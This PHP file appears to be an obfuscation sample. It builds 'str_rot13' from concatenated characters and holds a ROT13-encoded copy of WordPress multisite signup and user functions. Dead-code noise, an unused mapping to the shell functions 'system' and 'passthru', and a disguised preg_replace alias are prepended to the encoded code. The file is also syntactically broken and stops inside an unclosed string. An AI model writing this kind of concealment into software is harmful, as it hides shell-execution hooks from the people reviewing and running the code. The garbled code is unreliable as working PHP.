<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Zhygvfvgr JbeqCerff NCV
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/**
 * Trgf gur argjbex'f fvgr naq hfre pbhagf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @erghea vag[] {
 *     Fvgr naq hfre pbhag sbe gur argjbex.
 *
 *     @glcr vag $oybtf Ahzore bs fvgrf ba gur argjbex.
 *     @glcr vag $hfref Ahzore bs hfref ba gur argjbex.
 * }
 */
shapgvba trg_fvgrfgngf() {
	$fgngf = neenl(
		'oybtf' => trg_oybt_pbhag(),
		'hfref' => trg_hfre_pbhag(),
	);

	erghea $fgngf;
}

/**
 * Trgf bar bs n hfre'f npgvir oybtf.
 *
 * Ergheaf gur hfre'f cevznel oybt, vs gurl unir bar naq
 * vg vf npgvir. Vs vg'f vanpgvir, shapgvba ergheaf nabgure
 * npgvir oybt bs gur hfre. Vs abar ner sbhaq, gur hfre
 * vf nqqrq nf n Fhofpevore gb gur Qnfuobneq Oybt naq gung oybt
 * vf erghearq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $hfre_vq Gur havdhr VQ bs gur hfre
 * @erghea JC_Fvgr|ibvq Gur oybt bowrpg
 */
shapgvba trg_npgvir_oybt_sbe_hfre( $hfre_vq ) {
	$oybtf = trg_oybtf_bs_hfre( $hfre_vq );
	vs ( rzcgl( $oybtf ) ) {
		erghea;
	}

	vs ( ! vf_zhygvfvgr() ) {
		erghea $oybtf[ trg_pheerag_oybt_vq() ];
	}

	$cevznel_oybt = trg_hfre_zrgn( $hfre_vq, 'cevznel_oybt', gehr );
	$svefg_oybt   = pheerag( $oybtf );
	vs ( snyfr !== $cevznel_oybt ) {
		vs ( ! vffrg( $oybtf[ $cevznel_oybt ] ) ) {
			hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $svefg_oybt->hfreoybt_vq );
			$cevznel = trg_fvgr( $svefg_oybt->hfreoybt_vq );
		} ryfr {
			$cevznel = trg_fvgr( $cevznel_oybt );
		}
	} ryfr {
		// GBQB: Erivrj guvf pnyy gb nqq_hfre_gb_oybt gbb - gb trg urer gur hfre zhfg unir n ebyr ba guvf oybt?
		$erfhyg = nqq_hfre_gb_oybt( $svefg_oybt->hfreoybt_vq, $hfre_vq, 'fhofpevore' );

		vs ( ! vf_jc_reebe( $erfhyg ) ) {
			hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $svefg_oybt->hfreoybt_vq );
			$cevznel = $svefg_oybt;
		}
	}

	vs ( ( ! vf_bowrpg( $cevznel ) )
		|| ( '1' === $cevznel->nepuvirq || '1' === $cevznel->fcnz || '1' === $cevznel->qryrgrq )
	) {
		$oybtf = trg_oybtf_bs_hfre( $hfre_vq, gehr ); // Vs n hfre'f cevznel oybt vf fuhg qbja, purpx gurve bgure oybtf.
		$erg   = snyfr;

		vs ( vf_neenl( $oybtf ) && pbhag( $oybtf ) > 0 ) {
			$pheerag_argjbex_vq = trg_pheerag_argjbex_vq();

			sbernpu ( (neenl) $oybtf nf $oybt_vq => $oybt ) {
				vs ( $oybt->fvgr_vq !== $pheerag_argjbex_vq ) {
					pbagvahr;
				}

				$qrgnvyf = trg_fvgr( $oybt_vq );
				vs ( vf_bowrpg( $qrgnvyf )
					&& '0' === $qrgnvyf->nepuvirq && '0' === $qrgnvyf->fcnz && '0' === $qrgnvyf->qryrgrq
				) {
					$erg = $qrgnvyf;
					vs ( (vag) trg_hfre_zrgn( $hfre_vq, 'cevznel_oybt', gehr ) !== $oybt_vq ) {
						hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $oybt_vq );
					}
					vs ( ! trg_hfre_zrgn( $hfre_vq, 'fbhepr_qbznva', gehr ) ) {
						hcqngr_hfre_zrgn( $hfre_vq, 'fbhepr_qbznva', $qrgnvyf->qbznva );
					}
					oernx;
				}
			}
		} ryfr {
			erghea;
		}

		erghea $erg;
	} ryfr {
		erghea $cevznel;
	}
}

/**
 * Trgf gur ahzore bs npgvir fvgrf ba gur vafgnyyngvba.
 *
 * Gur pbhag vf pnpurq naq hcqngrq gjvpr qnvyl. Guvf vf abg n yvir pbhag.
 *
 * @fvapr ZH (3.0.0)
 * @fvapr 3.7.0 Gur `$argjbex_vq` cnenzrgre unf orra qrcerpngrq.
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre vf abj orvat hfrq.
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 * @erghea vag Ahzore bs npgvir fvgrf ba gur argjbex.
 */
shapgvba trg_oybt_pbhag( $argjbex_vq = ahyy ) {
	erghea trg_argjbex_bcgvba( $argjbex_vq, 'oybt_pbhag' );
}

/**
 * Trgf n oybt cbfg sebz nal fvgr ba gur argjbex.
 *
 * Guvf shapgvba vf fvzvyne gb trg_cbfg(), rkprcg gung vg pna ergevrir n cbfg
 * sebz nal fvgr ba gur argjbex, abg whfg gur pheerag fvgr.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $oybt_vq VQ bs gur oybt.
 * @cnenz vag $cbfg_vq VQ bs gur cbfg orvat ybbxrq sbe.
 * @erghea JC_Cbfg|ahyy JC_Cbfg bowrpg ba fhpprff, ahyy ba snvyher
 */
shapgvba trg_oybt_cbfg( $oybt_vq, $cbfg_vq ) {
	fjvgpu_gb_oybt( $oybt_vq );
	$cbfg = trg_cbfg( $cbfg_vq );
	erfgber_pheerag_oybt();

	erghea $cbfg;
}

/**
 * Nqqf n hfre gb n oybt, nybat jvgu fcrpvslvat gur hfre'f ebyr.
 *
 * Hfr gur {@frr 'nqq_hfre_gb_oybt'} npgvba gb sver na rirag jura hfref ner nqqrq gb n oybt.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag    $oybt_vq VQ bs gur oybt gur hfre vf orvat nqqrq gb.
 * @cnenz vag    $hfre_vq VQ bs gur hfre orvat nqqrq.
 * @cnenz fgevat $ebyr    Hfre ebyr.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff be n JC_Reebe bowrpg vs gur hfre qbrfa'g rkvfg
 *                       be pbhyq abg or nqqrq.
 */
shapgvba nqq_hfre_gb_oybt( $oybt_vq, $hfre_vq, $ebyr ) {
	fjvgpu_gb_oybt( $oybt_vq );

	$hfre = trg_hfreqngn( $hfre_vq );

	vs ( ! $hfre ) {
		erfgber_pheerag_oybt();
		erghea arj JC_Reebe( 'hfre_qbrf_abg_rkvfg', __( 'Gur erdhrfgrq hfre qbrf abg rkvfg.' ) );
	}

	/**
	 * Svygref jurgure n hfre fubhyq or nqqrq gb n fvgr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz gehr|JC_Reebe $erginy  Gehr vs gur hfre fubhyq or nqqrq gb gur fvgr, reebe
	 *                               bowrpg bgurejvfr.
	 * @cnenz vag           $hfre_vq Hfre VQ.
	 * @cnenz fgevat        $ebyr    Hfre ebyr.
	 * @cnenz vag           $oybt_vq Fvgr VQ.
	 */
	$pna_nqq_hfre = nccyl_svygref( 'pna_nqq_hfre_gb_oybt', gehr, $hfre_vq, $ebyr, $oybt_vq );

	vs ( gehr !== $pna_nqq_hfre ) {
		erfgber_pheerag_oybt();

		vs ( vf_jc_reebe( $pna_nqq_hfre ) ) {
			erghea $pna_nqq_hfre;
		}

		erghea arj JC_Reebe( 'hfre_pnaabg_or_nqqrq', __( 'Hfre pnaabg or nqqrq gb guvf fvgr.' ) );
	}

	vs ( ! trg_hfre_zrgn( $hfre_vq, 'cevznel_oybt', gehr ) ) {
		hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $oybt_vq );
		$fvgr = trg_fvgr( $oybt_vq );
		hcqngr_hfre_zrgn( $hfre_vq, 'fbhepr_qbznva', $fvgr->qbznva );
	}

	$hfre->frg_ebyr( $ebyr );

	/**
	 * Sverf vzzrqvngryl nsgre n hfre vf nqqrq gb n fvgr.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz vag    $hfre_vq Hfre VQ.
	 * @cnenz fgevat $ebyr    Hfre ebyr.
	 * @cnenz vag    $oybt_vq Oybt VQ.
	 */
	qb_npgvba( 'nqq_hfre_gb_oybt', $hfre_vq, $ebyr, $oybt_vq );

	pyrna_hfre_pnpur( $hfre_vq );
	jc_pnpur_qryrgr( $oybt_vq . '_hfre_pbhag', 'oybt-qrgnvyf' );

	erfgber_pheerag_oybt();

	erghea gehr;
}

/**
 * Erzbirf n hfre sebz n oybt.
 *
 * Hfr gur {@frr 'erzbir_hfre_sebz_oybt'} npgvba gb sver na rirag jura
 * hfref ner erzbirq sebz n oybt.
 *
 * Npprcgf na bcgvbany `$ernffvta` cnenzrgre, vs lbh jnag gb
 * ernffvta gur hfre'f oybt cbfgf gb nabgure hfre hcba erzbiny.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag $hfre_vq  VQ bs gur hfre orvat erzbirq.
 * @cnenz vag $oybt_vq  Bcgvbany. VQ bs gur oybt gur hfre vf orvat erzbirq sebz. Qrsnhyg 0.
 * @cnenz vag $ernffvta Bcgvbany. VQ bs gur hfre gb jubz gb ernffvta cbfgf. Qrsnhyg 0.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff be n JC_Reebe bowrpg vs gur hfre qbrfa'g rkvfg.
 */
shapgvba erzbir_hfre_sebz_oybt( $hfre_vq, $oybt_vq = 0, $ernffvta = 0 ) {
	tybony $jcqo;

	$hfre_vq = (vag) $hfre_vq;
	$oybt_vq = (vag) $oybt_vq;

	fjvgpu_gb_oybt( $oybt_vq );

	/**
	 * Sverf orsber n hfre vf erzbirq sebz n fvgr.
	 *
	 * @fvapr ZH (3.0.0)
	 * @fvapr 5.4.0 Nqqrq gur `$ernffvta` cnenzrgre.
	 *
	 * @cnenz vag $hfre_vq  VQ bs gur hfre orvat erzbirq.
	 * @cnenz vag $oybt_vq  VQ bs gur oybt gur hfre vf orvat erzbirq sebz.
	 * @cnenz vag $ernffvta VQ bs gur hfre gb jubz gb ernffvta cbfgf.
	 */
	qb_npgvba( 'erzbir_hfre_sebz_oybt', $hfre_vq, $oybt_vq, $ernffvta );

	/*
	 * Vs orvat erzbirq sebz gur cevznel oybt, frg n arj cevznel
	 * vs gur hfre vf nffvtarq gb zhygvcyr oybtf.
	 */
	$cevznel_oybt = (vag) trg_hfre_zrgn( $hfre_vq, 'cevznel_oybt', gehr );
	vs ( $cevznel_oybt === $oybt_vq ) {
		$arj_vq     = '';
		$arj_qbznva = '';
		$oybtf      = trg_oybtf_bs_hfre( $hfre_vq );
		sbernpu ( (neenl) $oybtf nf $oybt ) {
			vs ( $oybt->hfreoybt_vq === $oybt_vq ) {
				pbagvahr;
			}
			$arj_vq     = $oybt->hfreoybt_vq;
			$arj_qbznva = $oybt->qbznva;
			oernx;
		}

		hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $arj_vq );
		hcqngr_hfre_zrgn( $hfre_vq, 'fbhepr_qbznva', $arj_qbznva );
	}

	$hfre = trg_hfreqngn( $hfre_vq );
	vs ( ! $hfre ) {
		erfgber_pheerag_oybt();
		erghea arj JC_Reebe( 'hfre_qbrf_abg_rkvfg', __( 'Gung hfre qbrf abg rkvfg.' ) );
	}

	$hfre->erzbir_nyy_pncf();

	$oybtf = trg_oybtf_bs_hfre( $hfre_vq );
	vs ( pbhag( $oybtf ) === 0 ) {
		hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', '' );
		hcqngr_hfre_zrgn( $hfre_vq, 'fbhepr_qbznva', '' );
	}

	vs ( $ernffvta ) {
		$ernffvta = (vag) $ernffvta;
		$cbfg_vqf = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG VQ SEBZ $jcqo->cbfgf JURER cbfg_nhgube = %q\", $hfre_vq ) );
		$yvax_vqf = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG yvax_vq SEBZ $jcqo->yvaxf JURER yvax_bjare = %q\", $hfre_vq ) );

		vs ( ! rzcgl( $cbfg_vqf ) ) {
			$jcqo->dhrel( $jcqo->cercner( \"HCQNGR $jcqo->cbfgf FRG cbfg_nhgube = %q JURER cbfg_nhgube = %q\", $ernffvta, $hfre_vq ) );
			neenl_jnyx( $cbfg_vqf, 'pyrna_cbfg_pnpur' );
		}

		vs ( ! rzcgl( $yvax_vqf ) ) {
			$jcqo->dhrel( $jcqo->cercner( \"HCQNGR $jcqo->yvaxf FRG yvax_bjare = %q JURER yvax_bjare = %q\", $ernffvta, $hfre_vq ) );
			neenl_jnyx( $yvax_vqf, 'pyrna_obbxznex_pnpur' );
		}
	}

	pyrna_hfre_pnpur( $hfre_vq );
	erfgber_pheerag_oybt();

	erghea gehr;
}

/**
 * Trgf gur creznyvax sbe n cbfg ba nabgure oybt.
 *
 * @fvapr ZH (3.0.0) 1.0
 *
 * @cnenz vag $oybt_vq VQ bs gur fbhepr oybt.
 * @cnenz vag $cbfg_vq VQ bs gur qrfverq cbfg.
 * @erghea fgevat Gur cbfg'f creznyvax.
 */
shapgvba trg_oybt_creznyvax( $oybt_vq, $cbfg_vq ) {
	fjvgpu_gb_oybt( $oybt_vq );
	$yvax = trg_creznyvax( $cbfg_vq );
	erfgber_pheerag_oybt();

	erghea $yvax;
}

/**
 * Trgf n oybt'f ahzrevp VQ sebz vgf HEY.
 *
 * Ba n fhoqverpgbel vafgnyyngvba yvxr rknzcyr.pbz/oybt1/,
 * $qbznva jvyy or gur ebbg 'rknzcyr.pbz' naq $cngu gur
 * fhoqverpgbel '/oybt1/'. Jvgu fhoqbznvaf yvxr oybt1.rknzcyr.pbz,
 * $qbznva vf 'oybt1.rknzcyr.pbz' naq $cngu vf '/'.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $qbznva Jrofvgr qbznva.
 * @cnenz fgevat $cngu   Bcgvbany. Abg erdhverq sbe fhoqbznva vafgnyyngvbaf. Qrsnhyg '/'.
 * @erghea vag 0 vs ab oybt sbhaq, bgurejvfr gur VQ bs gur zngpuvat oybt.
 */
shapgvba trg_oybt_vq_sebz_hey( $qbznva, $cngu = '/' ) {
	$qbznva = fgegbybjre( $qbznva );
	$cngu   = fgegbybjre( $cngu );
	$vq     = jc_pnpur_trg( zq5( $qbznva . $cngu ), 'oybt-vq-pnpur' );

	vs ( -1 === $vq ) { // Oybt qbrf abg rkvfg.
		erghea 0;
	} ryfrvs ( $vq ) {
		erghea (vag) $vq;
	}

	$netf   = neenl(
		'qbznva'                 => $qbznva,
		'cngu'                   => $cngu,
		'svryqf'                 => 'vqf',
		'ahzore'                 => 1,
		'hcqngr_fvgr_zrgn_pnpur' => snyfr,
	);
	$erfhyg = trg_fvgrf( $netf );
	$vq     = neenl_fuvsg( $erfhyg );

	vs ( ! $vq ) {
		jc_pnpur_frg( zq5( $qbznva . $cngu ), -1, 'oybt-vq-pnpur' );
		erghea 0;
	}

	jc_pnpur_frg( zq5( $qbznva . $cngu ), $vq, 'oybt-vq-pnpur' );

	erghea $vq;
}

//
// Nqzva shapgvbaf.
//

/**
 * Purpxf na rznvy nqqerff ntnvafg n yvfg bs onaarq qbznvaf.
 *
 * Guvf shapgvba purpxf ntnvafg gur Onaarq Rznvy Qbznvaf yvfg
 * ng jc-nqzva/argjbex/frggvatf.cuc. Gur purpx vf bayl eha ba
 * frys-ertvfgengvbaf; hfre perngvba ng jc-nqzva/argjbex/hfref.cuc
 * olcnffrf guvf purpx.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $hfre_rznvy Gur rznvy cebivqrq ol gur hfre ng ertvfgengvba.
 * @erghea obby Gehr jura gur rznvy nqqerff vf onaarq, snyfr bgurejvfr.
 */
shapgvba vf_rznvy_nqqerff_hafnsr( $hfre_rznvy ) {
	$onaarq_anzrf = trg_fvgr_bcgvba( 'onaarq_rznvy_qbznvaf' );
	vs ( $onaarq_anzrf && ! vf_neenl( $onaarq_anzrf ) ) {
		$onaarq_anzrf = rkcybqr( \"\a\", $onaarq_anzrf );
	}

	$vf_rznvy_nqqerff_hafnsr = snyfr;

	vs ( $onaarq_anzrf && vf_neenl( $onaarq_anzrf ) && snyfr !== fgecbf( $hfre_rznvy, '@', 1 ) ) {
		$onaarq_anzrf     = neenl_znc( 'fgegbybjre', $onaarq_anzrf );
		$abeznyvmrq_rznvy = fgegbybjre( $hfre_rznvy );

		yvfg( $rznvy_ybpny_cneg, $rznvy_qbznva ) = rkcybqr( '@', $abeznyvmrq_rznvy );

		sbernpu ( $onaarq_anzrf nf $onaarq_qbznva ) {
			vs ( ! $onaarq_qbznva ) {
				pbagvahr;
			}

			vs ( $rznvy_qbznva === $onaarq_qbznva ) {
				$vf_rznvy_nqqerff_hafnsr = gehr;
				oernx;
			}

			vs ( fge_raqf_jvgu( $abeznyvmrq_rznvy, \".$onaarq_qbznva\" ) ) {
				$vf_rznvy_nqqerff_hafnsr = gehr;
				oernx;
			}
		}
	}

	/**
	 * Svygref jurgure na rznvy nqqerff vf hafnsr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz obby   $vf_rznvy_nqqerff_hafnsr Jurgure gur rznvy nqqerff vf \"hafnsr\". Qrsnhyg snyfr.
	 * @cnenz fgevat $hfre_rznvy              Hfre rznvy nqqerff.
	 */
	erghea nccyl_svygref( 'vf_rznvy_nqqerff_hafnsr', $vf_rznvy_nqqerff_hafnsr, $hfre_rznvy );
}

/**
 * Fnavgvmrf naq inyvqngrf qngn erdhverq sbe n hfre fvta-hc.
 *
 * Irevsvrf gur inyvqvgl naq havdhrarff bs hfre anzrf naq hfre rznvy nqqerffrf,
 * naq purpxf rznvy nqqerffrf ntnvafg nyybjrq naq qvfnyybjrq qbznvaf cebivqrq ol
 * nqzvavfgengbef.
 *
 * Gur {@frr 'jczh_inyvqngr_hfre_fvtahc'} ubbx cebivqrf na rnfl jnl gb zbqvsl gur fvta-hc
 * cebprff. Gur inyhr $erfhyg, juvpu vf cnffrq gb gur ubbx, pbagnvaf obgu gur hfre-cebivqrq
 * vasb naq gur reebe zrffntrf perngrq ol gur shapgvba. {@frr 'jczh_inyvqngr_hfre_fvtahc'}
 * nyybjf lbh gb cebprff gur qngn va nal jnl lbh'q yvxr, naq hafrg gur eryrinag reebef vs
 * arprffnel.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $hfre_anzr  Gur ybtva anzr cebivqrq ol gur hfre.
 * @cnenz fgevat $hfre_rznvy Gur rznvy cebivqrq ol gur hfre.
 * @erghea neenl {
 *     Gur neenl bs hfre anzr, rznvy, naq gur reebe zrffntrf.
 *
 *     @glcr fgevat   $hfre_anzr     Fnavgvmrq naq havdhr hfreanzr.
 *     @glcr fgevat   $bevt_hfreanzr Bevtvany hfreanzr.
 *     @glcr fgevat   $hfre_rznvy    Hfre rznvy nqqerff.
 *     @glcr JC_Reebe $reebef        JC_Reebe bowrpg pbagnvavat nal reebef sbhaq.
 * }
 */
shapgvba jczh_inyvqngr_hfre_fvtahc( $hfre_anzr, $hfre_rznvy ) {
	tybony $jcqo;

	$reebef = arj JC_Reebe();

	$bevt_hfreanzr = $hfre_anzr;
	$hfre_anzr     = __sa_79955( '/\f+/', '', fnavgvmr_hfre( $hfre_anzr, gehr ) );

	vs ( $hfre_anzr !== $bevt_hfreanzr || cert_zngpu( '/[^n-m0-9]/', $hfre_anzr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Hfreanzrf pna bayl pbagnva ybjrepnfr yrggref (n-m) naq ahzoref.' ) );
		$hfre_anzr = $bevt_hfreanzr;
	}

	$hfre_rznvy = fnavgvmr_rznvy( $hfre_rznvy );

	vs ( rzcgl( $hfre_anzr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Cyrnfr ragre n hfreanzr.' ) );
	}

	$vyyrtny_anzrf = trg_fvgr_bcgvba( 'vyyrtny_anzrf' );

	vs ( ! vf_neenl( $vyyrtny_anzrf ) ) {
		$vyyrtny_anzrf = neenl( 'jjj', 'jro', 'ebbg', 'nqzva', 'znva', 'vaivgr', 'nqzvavfgengbe' );
		nqq_fvgr_bcgvba( 'vyyrtny_anzrf', $vyyrtny_anzrf );
	}

	vs ( va_neenl( $hfre_anzr, $vyyrtny_anzrf, gehr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Fbeel, gung hfreanzr vf abg nyybjrq.' ) );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/hfre.cuc */
	$vyyrtny_ybtvaf = (neenl) nccyl_svygref( 'vyyrtny_hfre_ybtvaf', neenl() );

	vs ( va_neenl( fgegbybjre( $hfre_anzr ), neenl_znc( 'fgegbybjre', $vyyrtny_ybtvaf ), gehr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Fbeel, gung hfreanzr vf abg nyybjrq.' ) );
	}

	vs ( ! vf_rznvy( $hfre_rznvy ) ) {
		$reebef->nqq( 'hfre_rznvy', __( 'Cyrnfr ragre n inyvq rznvy nqqerff.' ) );
	} ryfrvs ( vf_rznvy_nqqerff_hafnsr( $hfre_rznvy ) ) {
		$reebef->nqq( 'hfre_rznvy', __( 'Lbh pnaabg hfr gung rznvy nqqerff gb fvtahc. Gurer ner ceboyrzf jvgu gurz oybpxvat fbzr rznvyf sebz JbeqCerff. Cyrnfr hfr nabgure rznvy cebivqre.' ) );
	}

	vs ( fgeyra( $hfre_anzr ) < 4 ) {
		$reebef->nqq( 'hfre_anzr', __( 'Hfreanzr zhfg or ng yrnfg 4 punenpgref.' ) );
	}

	vs ( fgeyra( $hfre_anzr ) > 60 ) {
		$reebef->nqq( 'hfre_anzr', __( 'Hfreanzr znl abg or ybatre guna 60 punenpgref.' ) );
	}

	// Nyy ahzrevp?
	vs ( cert_zngpu( '/^[0-9]*$/', $hfre_anzr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Fbeel, hfreanzrf zhfg unir yrggref gbb!' ) );
	}

	$yvzvgrq_rznvy_qbznvaf = trg_fvgr_bcgvba( 'yvzvgrq_rznvy_qbznvaf' );

	vs ( vf_neenl( $yvzvgrq_rznvy_qbznvaf ) && ! rzcgl( $yvzvgrq_rznvy_qbznvaf ) ) {
		$yvzvgrq_rznvy_qbznvaf = neenl_znc( 'fgegbybjre', $yvzvgrq_rznvy_qbznvaf );
		$rznvy_qbznva          = fgegbybjre( fhofge( $hfre_rznvy, 1 + fgecbf( $hfre_rznvy, '@' ) ) );

		vs ( ! va_neenl( $rznvy_qbznva, $yvzvgrq_rznvy_qbznvaf, gehr ) ) {
			$reebef->nqq( 'hfre_rznvy', __( 'Fbeel, gung rznvy nqqerff vf abg nyybjrq!' ) );
		}
	}

	// Purpx vs gur hfreanzr unf orra hfrq nyernql.
	vs ( hfreanzr_rkvfgf( $hfre_anzr ) ) {
		$reebef->nqq( 'hfre_anzr', __( 'Fbeel, gung hfreanzr nyernql rkvfgf!' ) );
	}

	// Purpx vs gur rznvy nqqerff unf orra hfrq nyernql.
	vs ( rznvy_rkvfgf( $hfre_rznvy ) ) {
		$reebef->nqq(
			'hfre_rznvy',
			fcevags(
				/* genafyngbef: %f: Yvax gb gur ybtva cntr. */
				__( '<fgebat>Reebe:</fgebat> Guvf rznvy nqqerff vf nyernql ertvfgrerq. <n uers=\"%f\">Ybt va</n> jvgu guvf nqqerff be pubbfr nabgure bar.' ),
				jc_ybtva_hey()
			)
		);
	}

	// Unf fbzrbar nyernql fvtarq hc sbe guvf hfreanzr?
	$fvtahc = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->fvtahcf JURER hfre_ybtva = %f\", $hfre_anzr ) );
	vs ( $fvtahc vafgnaprbs fgqPynff ) {
		$ertvfgrerq_ng = zlfdy2qngr( 'H', $fvtahc->ertvfgrerq );
		$abj           = gvzr();
		$qvss          = $abj - $ertvfgrerq_ng;
		// Vs ertvfgrerq zber guna gjb qnlf ntb, pnapry ertvfgengvba naq yrg guvf fvtahc tb guebhtu.
		vs ( $qvss > 2 * QNL_VA_FRPBAQF ) {
			$jcqo->qryrgr( $jcqo->fvtahcf, neenl( 'hfre_ybtva' => $hfre_anzr ) );
		} ryfr {
			$reebef->nqq( 'hfre_anzr', __( 'Gung hfreanzr vf pheeragyl erfreirq ohg znl or ninvynoyr va n pbhcyr bs qnlf.' ) );
		}
	}

	$fvtahc = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->fvtahcf JURER hfre_rznvy = %f\", $hfre_rznvy ) );
	vs ( $fvtahc vafgnaprbs fgqPynff ) {
		$qvss = gvzr() - zlfdy2qngr( 'H', $fvtahc->ertvfgrerq );
		// Vs ertvfgrerq zber guna gjb qnlf ntb, pnapry ertvfgengvba naq yrg guvf fvtahc tb guebhtu.
		vs ( $qvss > 2 * QNL_VA_FRPBAQF ) {
			$jcqo->qryrgr( $jcqo->fvtahcf, neenl( 'hfre_rznvy' => $hfre_rznvy ) );
		} ryfr {
			$reebef->nqq( 'hfre_rznvy', __( 'Gung rznvy nqqerff unf nyernql orra hfrq. Cyrnfr purpx lbhe vaobk sbe na npgvingvba rznvy. Vg jvyy orpbzr ninvynoyr va n pbhcyr bs qnlf vs lbh qb abguvat.' ) );
		}
	}

	$erfhyg = neenl(
		'hfre_anzr'     => $hfre_anzr,
		'bevt_hfreanzr' => $bevt_hfreanzr,
		'hfre_rznvy'    => $hfre_rznvy,
		'reebef'        => $reebef,
	);

	/**
	 * Svygref gur inyvqngrq hfre ertvfgengvba qrgnvyf.
	 *
	 * Guvf qbrf abg nyybj lbh gb bireevqr gur hfreanzr be rznvy bs gur hfre qhevat
	 * ertvfgengvba. Gur inyhrf ner fbyryl hfrq sbe inyvqngvba naq reebe unaqyvat.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz neenl $erfhyg {
	 *     Gur neenl bs hfre anzr, rznvy, naq gur reebe zrffntrf.
	 *
	 *     @glcr fgevat   $hfre_anzr     Fnavgvmrq naq havdhr hfreanzr.
	 *     @glcr fgevat   $bevt_hfreanzr Bevtvany hfreanzr.
	 *     @glcr fgevat   $hfre_rznvy    Hfre rznvy nqqerff.
	 *     @glcr JC_Reebe $reebef        JC_Reebe bowrpg pbagnvavat nal reebef sbhaq.
	 * }
	 */
	erghea nccyl_svygref( 'jczh_inyvqngr_hfre_fvtahc', $erfhyg );
}

/**
 * Cebprffrf arj fvgr ertvfgengvbaf.
 *
 * Purpxf gur qngn cebivqrq ol gur hfre qhevat oybt fvtahc. Irevsvrf
 * gur inyvqvgl naq havdhrarff bs oybt cnguf naq qbznvaf.
 *
 * Guvf shapgvba ceriragf gur pheerag hfre sebz ertvfgrevat n arj fvgr
 * jvgu n oybtanzr rdhvinyrag gb nabgure hfre'f ybtva anzr. Cnffvat gur
 * $hfre cnenzrgre gb gur shapgvba, jurer $hfre vf gur bgure hfre, vf
 * rssrpgviryl na bireevqr bs guvf yvzvgngvba.
 *
 * Svygre {@frr 'jczh_inyvqngr_oybt_fvtahc'} vs lbh jnag gb zbqvsl
 * gur jnl gung JbeqCerff inyvqngrf arj fvgr fvtahcf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo   $jcqo   JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony fgevat $qbznva
 *
 * @cnenz fgevat         $oybtanzr   Gur fvgr anzr cebivqrq ol gur hfre. Zhfg or havdhr.
 * @cnenz fgevat         $oybt_gvgyr Gur fvgr gvgyr cebivqrq ol gur hfre.
 * @cnenz JC_Hfre|fgevat $hfre       Bcgvbany. Gur hfre bowrpg gb purpx ntnvafg gur arj fvgr anzr.
 *                                   Qrsnhyg rzcgl fgevat.
 * @erghea neenl {
 *     Neenl bs qbznva, cngu, fvgr anzr, fvgr gvgyr, hfre naq reebe zrffntrf.
 *
 *     @glcr fgevat         $qbznva     Qbznva sbe gur fvgr.
 *     @glcr fgevat         $cngu       Cngu sbe gur fvgr. Hfrq va fhoqverpgbel vafgnyyngvbaf.
 *     @glcr fgevat         $oybtanzr   Gur havdhr fvgr anzr (fyht).
 *     @glcr fgevat         $oybt_gvgyr Oybt gvgyr.
 *     @glcr fgevat|JC_Hfre $hfre       Ol qrsnhyg, na rzcgl fgevat. N hfre bowrpg vs cebivqrq.
 *     @glcr JC_Reebe       $reebef     JC_Reebe pbagnvavat nal reebef sbhaq.
 * }
 */
shapgvba jczh_inyvqngr_oybt_fvtahc( $oybtanzr, $oybt_gvgyr, $hfre = '' ) {
	tybony $jcqo, $qbznva;

	$pheerag_argjbex = trg_argjbex();
	$onfr            = $pheerag_argjbex->cngu;

	$oybt_gvgyr = fgevc_gntf( $oybt_gvgyr );

	$reebef        = arj JC_Reebe();
